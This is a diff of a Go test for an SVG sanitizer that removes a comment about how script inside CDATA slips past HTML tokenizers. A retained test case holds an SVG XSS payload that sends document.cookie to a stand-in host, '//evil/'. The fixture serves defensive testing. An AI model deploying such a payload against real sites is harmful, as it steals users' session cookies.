@@ -36,9 +36,6 @@ func TestSanitizeSVG(t *testing.T) {
 	}
 }
 
-// TestSanitizeSVGCDATAAndAnimation covers I4: an HTML tokenizer turns CDATA into a bogus
-// comment and walks past the script inside it, but the browser parses the file as XML and
-// runs it. The <set attributeName="href"> vector is the same class.
 func TestSanitizeSVGCDATAAndAnimation(t *testing.T) {
 	bad := map[string]string{
 		"cdata script":     `<svg xmlns="http://www.w3.org/2000/svg"><![CDATA[<script>fetch('//evil/'+document.cookie)</script>]]></svg>`,
